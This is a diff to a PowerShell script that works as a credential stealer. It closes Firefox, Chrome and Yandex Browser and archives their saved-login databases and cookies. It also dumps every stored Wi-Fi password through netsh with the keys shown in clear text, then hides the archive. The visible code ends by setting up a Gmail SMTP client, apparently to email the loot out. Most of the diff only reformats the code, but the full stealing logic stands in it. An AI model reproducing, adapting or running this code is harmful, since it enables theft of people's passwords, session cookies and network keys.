@@ -2,24 +2,37 @@ echo "qwe"
 
 $p=$env:TEMP+"\d"+(Get-Random -max 17071707)+".zip"
 
-if(Test-Path -Path "C:\Program Files\WinRAR\WinRAR.exe"){$arh="WinRar"}elseif(Test-Path -Path "C:\Program Files\7-Zip\7z.exe"){Set-Location -Path "C:\Program Files\7-Zip\";$arh="7-Zip"}
+if(Test-Path -Path "C:\Program Files\WinRAR\WinRAR.exe")
+  {$arh="WinRar"}
+elseif(Test-Path -Path "C:\Program Files\7-Zip\7z.exe")
+  {Set-Location -Path "C:\Program Files\7-Zip\";$arh="7-Zip"}
 
 $f=($env:APPDATA+"\Mozilla\Firefox\Profiles\*");if(Test-Path -Path $f){Stop-Process -Name firefox -ErrorAction SilentlyContinue;
-if("WinRAR"-in $arh){Get-ChildItem -Path $f -Include "logins.json","*.db" -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p}
-elseif("7-Zip" -in $arh){.\7z.exe a $p (Get-ChildItem -Path $f -Include "logins.json","*.db" -Recurse) -spf -tzip}}else{echo "asd"}
+if("WinRAR"-in $arh)
+  {Get-ChildItem -Path $f -Include "logins.json","*.db" -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p}
+elseif("7-Zip" -in $arh)
+  {.\7z.exe a $p (Get-ChildItem -Path $f -Include "logins.json","*.db" -Recurse) -spf -tzip}}else{echo "asd"}
 
 $g=($env:LOCALAPPDATA+"\Google\Chrome\User Data\Default\");if(Test-Path -Path $g){Stop-Process -Name chrome -ErrorAction SilentlyContinue;
-if("WinRAR"-in $arh){Get-ChildItem -Path $g -Include "Login Data", "Cookies" -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p}
-elseif("7-Zip" -in $arh){.\7z.exe a $p ($g+"Login Data") ($g+"Cookies") -spf -tzip}}else{echo "asd"}
+if("WinRAR"-in $arh)
+  {Get-ChildItem -Path $g -Include "Login Data", "Cookies" -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p}
+elseif("7-Zip" -in $arh)
+  {.\7z.exe a $p ($g+"Login Data") ($g+"Cookies") -spf -tzip}}else{echo "asd"}
 
 $y=($env:LOCALAPPDATA+"\Yandex\YandexBrowser\User Data\Default\");if(Test-Path -Path $y){Stop-Process -Name browser -ErrorAction SilentlyContinue;
-if("WinRAR" -in $arh){Get-ChildItem -Path $y -Include ("Ya Passman Data"), ("Cookies") -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p}
-elseif("7-Zip"-in $arh){.\7z.exe a $p ($y+"Ya Passman Data"),($y+"Cookies") -spf -tzip}}else{echo "asd"}
+if("WinRAR" -in $arh)
+  {Get-ChildItem -Path $y -Include ("Ya Passman Data"), ("Cookies") -Recurse | Compress-Archive -Update -CompressionLevel Fastest -DestinationPath $p}
+elseif("7-Zip"-in $arh)
+  {.\7z.exe a $p ($y+"Ya Passman Data"),($y+"Cookies") -spf -tzip}}else{echo "asd"}
 
-(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Содержимое ключа\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ ESSID=$name;PASS=$pass }} | Format-Table -AutoSize > $env:TEMP\p.txt
 $w=$env:TEMP\p.txt
-if("WinRAR" -in $arh){Compress-Archive -Path $w -Update -CompressionLevel Fastest -DestinationPath $p}
-elseif("7-Zip"-in $arh){.\7z.exe a $p $w -spf -tzip}else{echo "asd"}
+(netsh wlan show profiles) | Select-String "\:(.+)$" | %{$name=$_.Matches.Groups[1].Value.Trim(); $_} | %{(netsh wlan show profile name="$name" key=clear)} | Select-String "Содержимое ключа\W+\:(.+)$" | %{$pass=$_.Matches.Groups[1].Value.Trim(); $_} | %{[PSCustomObject]@{ ESSID=$name;PASS=$pass }} | Format-Table -AutoSize > $w
+
+if("WinRAR" -in $arh)
+  {Compress-Archive -Path $w -Update -CompressionLevel Fastest -DestinationPath $p}
+elseif("7-Zip"-in $arh)
+  {.\7z.exe a $p $w -spf -tzip}
+
 attrib +H $p
 
 $SMTPServer="smtp.gmail.com";$SMTPInfo=New-Object Net.Mail.SmtpClient($SmtpServer,587);$SMTPInfo.EnableSsl=$true
